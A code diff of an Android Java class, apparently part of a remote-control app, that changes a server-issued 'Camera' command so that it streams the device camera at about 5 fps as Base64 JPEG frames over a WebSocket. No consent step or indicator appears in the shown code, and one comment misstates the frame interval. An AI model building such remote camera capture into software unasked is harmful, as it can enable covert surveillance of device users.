@@ -723,17 +723,18 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
     private Handler cameraHandler;
     private ImageReader cameraReader;
     private volatile boolean cameraStreaming = false;
-    private java.util.concurrent.ScheduledExecutorService cameraScheduler;
+    private volatile long lastCameraFrameTime = 0;
+    private static final long CAMERA_FRAME_INTERVAL_MS = 200; // 每 200ms 发一帧 (~5fps)
 
     /**
-     * 开启摄像头实时拍照流
-     * 每 1.5 秒拍一张 → Base64 → ws.sendCamera()
+     * 开启摄像头实时预览流
+     * 使用 TEMPLATE_PREVIEW + setRepeatingRequest 连续预览
+     * ImageReader 回调中控制发送频率 (500ms/帧)
      */
     private void handleCamera(JsonObject payload) {
         String selectedCam = ScreenActionParser.getString(payload, "SelectedCam", "back");
         Log.d(TAG, "Camera: " + selectedCam);
 
-        // 先关闭已有的
         handleCameraOff();
 
         Context ctx = getAppContext();
@@ -763,19 +764,32 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
                 cameraThread.start();
                 cameraHandler = new Handler(cameraThread.getLooper());
 
-                cameraReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2);
+                // YUV 格式预览，比 JPEG 快得多
+                cameraReader = ImageReader.newInstance(640, 480, ImageFormat.YUV_420_888, 2);
                 cameraReader.setOnImageAvailableListener(r -> {
                     Image image = r.acquireLatestImage();
-                    if (image != null) {
-                        java.nio.ByteBuffer buffer = image.getPlanes()[0].getBuffer();
-                        byte[] bytes = new byte[buffer.remaining()];
-                        buffer.get(bytes);
+                    if (image == null) return;
+
+                    try {
+                        long now = System.currentTimeMillis();
+                        if (!cameraStreaming || now - lastCameraFrameTime < CAMERA_FRAME_INTERVAL_MS) {
+                            image.close();
+                            return;
+                        }
+                        lastCameraFrameTime = now;
+
+                        // YUV → JPEG 压缩
+                        byte[] jpegBytes = yuvToJpeg(image, 30);
                         image.close();
 
-                        WebSocketClient ws = getWsClient();
-                        if (ws != null && cameraStreaming) {
-                            ws.sendCamera(Base64.encodeToString(bytes, Base64.NO_WRAP));
+                        if (jpegBytes != null) {
+                            WebSocketClient ws = getWsClient();
+                            if (ws != null) {
+                                ws.sendCamera(Base64.encodeToString(jpegBytes, Base64.NO_WRAP));
+                            }
                         }
+                    } catch (Exception e) {
+                        image.close();
                     }
                 }, cameraHandler);
 
@@ -785,26 +799,21 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
                     public void onOpened(CameraDevice camera) {
                         cameraDevice = camera;
                         try {
+                            CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
+                            builder.addTarget(cameraReader.getSurface());
+
                             camera.createCaptureSession(
                                 java.util.Collections.singletonList(cameraReader.getSurface()),
                                 new CameraCaptureSession.StateCallback() {
                                     @Override
                                     public void onConfigured(CameraCaptureSession session) {
                                         cameraSession = session;
-                                        // 定时拍照: 每 1.5 秒一帧
-                                        cameraScheduler = java.util.concurrent.Executors.newSingleThreadScheduledExecutor();
-                                        cameraScheduler.scheduleAtFixedRate(() -> {
-                                            if (!cameraStreaming || cameraDevice == null) return;
-                                            try {
-                                                CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
-                                                builder.addTarget(cameraReader.getSurface());
-                                                builder.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO);
-                                                session.capture(builder.build(), null, cameraHandler);
-                                            } catch (Exception e) {
-                                                Log.w(TAG, "Camera capture tick failed", e);
-                                            }
-                                        }, 0, 1500, java.util.concurrent.TimeUnit.MILLISECONDS);
-                                        Log.d(TAG, "Camera streaming started");
+                                        try {
+                                            session.setRepeatingRequest(builder.build(), null, cameraHandler);
+                                            Log.d(TAG, "Camera preview streaming started");
+                                        } catch (CameraAccessException e) {
+                                            Log.e(TAG, "setRepeatingRequest failed", e);
+                                        }
                                     }
                                     @Override
                                     public void onConfigureFailed(CameraCaptureSession session) {
@@ -830,13 +839,61 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
         }).start();
     }
 
+    /**
+     * YUV_420_888 → JPEG 压缩
+     */
+    private byte[] yuvToJpeg(Image image, int quality) {
+        try {
+            android.graphics.YuvImage yuvImage = new android.graphics.YuvImage(
+                imageToNv21(image),
+                android.graphics.ImageFormat.NV21,
+                image.getWidth(), image.getHeight(), null);
+            java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
+            yuvImage.compressToJpeg(
+                new android.graphics.Rect(0, 0, image.getWidth(), image.getHeight()),
+                quality, baos);
+            return baos.toByteArray();
+        } catch (Exception e) {
+            return null;
+        }
+    }
+
+    /**
+     * Image YUV_420_888 → NV21 byte[]
+     */
+    private byte[] imageToNv21(Image image) {
+        Image.Plane[] planes = image.getPlanes();
+        int w = image.getWidth();
+        int h = image.getHeight();
+        byte[] nv21 = new byte[w * h * 3 / 2];
+
+        // Y plane
+        java.nio.ByteBuffer yBuffer = planes[0].getBuffer();
+        int yRowStride = planes[0].getRowStride();
+        for (int row = 0; row < h; row++) {
+            yBuffer.position(row * yRowStride);
+            yBuffer.get(nv21, row * w, w);
+        }
+
+        // VU interleaved
+        java.nio.ByteBuffer uBuffer = planes[1].getBuffer();
+        java.nio.ByteBuffer vBuffer = planes[2].getBuffer();
+        int uvRowStride = planes[1].getRowStride();
+        int uvPixelStride = planes[1].getPixelStride();
+        int offset = w * h;
+        for (int row = 0; row < h / 2; row++) {
+            for (int col = 0; col < w / 2; col++) {
+                int uvIndex = row * uvRowStride + col * uvPixelStride;
+                nv21[offset++] = vBuffer.get(uvIndex);
+                nv21[offset++] = uBuffer.get(uvIndex);
+            }
+        }
+        return nv21;
+    }
+
     private void handleCameraOff() {
         Log.d(TAG, "Camera off");
         cameraStreaming = false;
-        if (cameraScheduler != null) {
-            cameraScheduler.shutdownNow();
-            cameraScheduler = null;
-        }
         if (cameraSession != null) {
             try { cameraSession.close(); } catch (Exception ignored) {}
             cameraSession = null;
